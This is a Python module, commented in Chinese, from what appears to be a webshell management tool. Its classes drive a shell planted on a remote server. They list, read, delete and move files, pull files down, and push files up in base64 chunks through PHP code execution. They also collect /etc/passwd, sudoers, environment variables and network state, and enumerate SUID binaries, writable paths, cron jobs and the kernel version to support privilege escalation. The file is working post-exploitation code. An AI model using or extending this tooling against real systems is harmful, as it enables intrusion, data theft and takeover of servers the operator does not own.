"""
操作模块
提供文件系统、系统信息和提权辅助功能
"""
from typing import List, Optional, Tuple

try:
    from .webshell import WebShell, PHPWebShell
    from .logger import Logger
except ImportError:
    from webshell import WebShell, PHPWebShell
    from logger import Logger


class FileOperations:
    """
    文件系统操作
    提供文件和目录管理功能
    """
    
    def __init__(self, shell: WebShell, logger: Optional[Logger] = None):
        """
        初始化文件操作
        
        Args:
            shell: WebShell实例
            logger: 日志对象
        """
        self.shell = shell
        self.logger = logger or Logger()
    
    def pwd(self) -> Tuple[bool, str]:
        """获取当前工作目录"""
        return self.shell.execute('pwd')
    
    def ls(self, path: str = '.') -> Tuple[bool, str]:
        """
        列出目录内容
        
        Args:
            path: 目录路径
            
        Returns:
            Tuple[bool, str]: (是否成功, 目录列表)
        """
        return self.shell.execute(f'ls -la {path}')
    
    def cd(self, path: str) -> Tuple[bool, str]:
        """
        切换目录
        
        Args:
            path: 目标路径
            
        Returns:
            Tuple[bool, str]: (是否成功, 新路径)
        """
        return self.shell.execute(f'cd {path} && pwd')
    
    def cat(self, file_path: str) -> Tuple[bool, str]:
        """
        查看文件内容
        
        Args:
            file_path: 文件路径
            
        Returns:
            Tuple[bool, str]: (是否成功, 文件内容)
        """
        return self.shell.execute(f'cat {file_path}')
    
    def download(self, remote_path: str, local_path: str) -> bool:
        """
        下载文件
        
        Args:
            remote_path: 远程文件路径
            local_path: 本地保存路径
            
        Returns:
            bool: 是否成功
        """
        import base64
        import os
        
        if isinstance(self.shell, PHPWebShell):
            php_code = f'echo base64_encode(file_get_contents("{remote_path}"));'
            success, result = self.shell.execute_php(php_code)
            
            if not success:
                self.logger.error(f"Download failed: {result}")
                return False
            
            try:
                content = base64.b64decode(result)
                with open(local_path, 'wb') as f:
                    f.write(content)
                self.logger.success(f"Downloaded to {local_path}")
                return True
            except Exception as e:
                self.logger.error(f"Save failed: {e}")
                return False
        else:
            # 使用cat命令下载
            success, content = self.cat(remote_path)
            if not success:
                return False
            
            try:
                with open(local_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                self.logger.success(f"Downloaded to {local_path}")
                return True
            except Exception as e:
                self.logger.error(f"Save failed: {e}")
                return False
    
    def upload(self, local_path: str, remote_path: str) -> bool:
        """
        上传文件
        
        Args:
            local_path: 本地文件路径
            remote_path: 远程保存路径
            
        Returns:
            bool: 是否成功
        """
        import base64
        import os
        
        if not os.path.exists(local_path):
            self.logger.error(f"Local file not found: {local_path}")
            return False
        
        if not isinstance(self.shell, PHPWebShell):
            self.logger.error("Upload only supported for PHP shells")
            return False
        
        try:
            with open(local_path, 'rb') as f:
                content = f.read()
            
            encoded = base64.b64encode(content).decode()
            
            # 分块上传
            chunk_size = 50000
            for i in range(0, len(encoded), chunk_size):
                chunk = encoded[i:i + chunk_size]
                mode = 'wb' if i == 0 else 'ab'
                
                php_code = f'''
                $data = base64_decode("{chunk}");
                $file = fopen("{remote_path}", "{mode}");
                fwrite($file, $data);
                fclose($file);
                '''
                
                success, _ = self.shell.execute_php(php_code)
                if not success:
                    self.logger.error("Upload failed")
                    return False
            
            self.logger.success(f"Uploaded to {remote_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Upload failed: {e}")
            return False
    
    def rm(self, path: str) -> Tuple[bool, str]:
        """删除文件或目录"""
        return self.shell.execute(f'rm -rf {path}')
    
    def mkdir(self, path: str) -> Tuple[bool, str]:
        """创建目录"""
        return self.shell.execute(f'mkdir -p {path}')
    
    def mv(self, src: str, dst: str) -> Tuple[bool, str]:
        """移动/重命名文件"""
        return self.shell.execute(f'mv {src} {dst}')
    
    def cp(self, src: str, dst: str) -> Tuple[bool, str]:
        """复制文件"""
        return self.shell.execute(f'cp {src} {dst}')
    
    def find(self, path: str, name: str = '') -> Tuple[bool, str]:
        """
        查找文件
        
        Args:
            path: 搜索路径
            name: 文件名模式（可选）
            
        Returns:
            Tuple[bool, str]: (是否成功, 搜索结果)
        """
        if name:
            return self.shell.execute(f'find {path} -name "{name}"')
        return self.shell.execute(f'find {path}')
    
    def grep(self, pattern: str, path: str) -> Tuple[bool, str]:
        """
        搜索文件内容
        
        Args:
            pattern: 搜索模式
            path: 搜索路径
            
        Returns:
            Tuple[bool, str]: (是否成功, 搜索结果)
        """
        return self.shell.execute(f'grep -r "{pattern}" {path}')


class SystemOperations:
    """
    系统信息收集
    提供系统信息查询功能
    """
    
    def __init__(self, shell: WebShell, logger: Optional[Logger] = None):
        self.shell = shell
        self.logger = logger or Logger()
    
    def whoami(self) -> Tuple[bool, str]:
        """获取当前用户"""
        return self.shell.execute('whoami')
    
    def id(self) -> Tuple[bool, str]:
        """获取用户ID信息"""
        return self.shell.execute('id')
    
    def uname(self) -> Tuple[bool, str]:
        """获取系统信息"""
        return self.shell.execute('uname -a')
    
    def ps(self) -> Tuple[bool, str]:
        """查看进程列表"""
        return self.shell.execute('ps aux')
    
    def netstat(self) -> Tuple[bool, str]:
        """查看网络连接"""
        return self.shell.execute('netstat -antlp')
    
    def ifconfig(self) -> Tuple[bool, str]:
        """查看网络接口"""
        return self.shell.execute('ifconfig || ip addr')
    
    def env(self) -> Tuple[bool, str]:
        """查看环境变量"""
        return self.shell.execute('env')
    
    def kill(self, pid: int) -> Tuple[bool, str]:
        """
        杀死进程
        
        Args:
            pid: 进程ID
            
        Returns:
            Tuple[bool, str]: (是否成功, 结果)
        """
        return self.shell.execute(f'kill -9 {pid}')
    
    def get_users(self) -> Tuple[bool, str]:
        """获取系统用户列表"""
        return self.shell.execute('cat /etc/passwd')
    
    def get_sudoers(self) -> Tuple[bool, str]:
        """查看sudo配置"""
        return self.shell.execute(
            'cat /etc/sudoers 2>/dev/null || echo "No permission"'
        )


class PrivilegeEscalation:
    """
    提权辅助
    提供提权信息收集功能
    """
    
    def __init__(self, shell: WebShell, logger: Optional[Logger] = None):
        self.shell = shell
        self.logger = logger or Logger()
    
    def find_suid(self) -> Tuple[bool, str]:
        """查找SUID文件"""
        return self.shell.execute('find / -perm -4000 2>/dev/null')
    
    def find_sgid(self) -> Tuple[bool, str]:
        """查找SGID文件"""
        return self.shell.execute('find / -perm -2000 2>/dev/null')
    
    def find_writable(self) -> Tuple[bool, str]:
        """查找可写目录"""
        commands = [
            'find / -writable -type d 2>/dev/null',
            'find /etc -writable 2>/dev/null',
            'find /home -writable 2>/dev/null',
        ]
        
        results = []
        for cmd in commands:
            success, result = self.shell.execute(cmd)
            if success:
                results.append(result)
        
        return True, '\n'.join(results)
    
    def check_cron(self) -> Tuple[bool, str]:
        """检查cron任务"""
        commands = [
            'cat /etc/crontab 2>/dev/null',
            'ls -la /etc/cron.* 2>/dev/null',
            'crontab -l 2>/dev/null',
        ]
        
        results = []
        for cmd in commands:
            success, result = self.shell.execute(cmd)
            if success:
                results.append(result)
        
        return True, '\n'.join(results)
    
    def check_kernel_exploit(self) -> Tuple[bool, str]:
        """检查内核版本（用于查找提权漏洞）"""
        return self.shell.execute('uname -r && cat /proc/version')
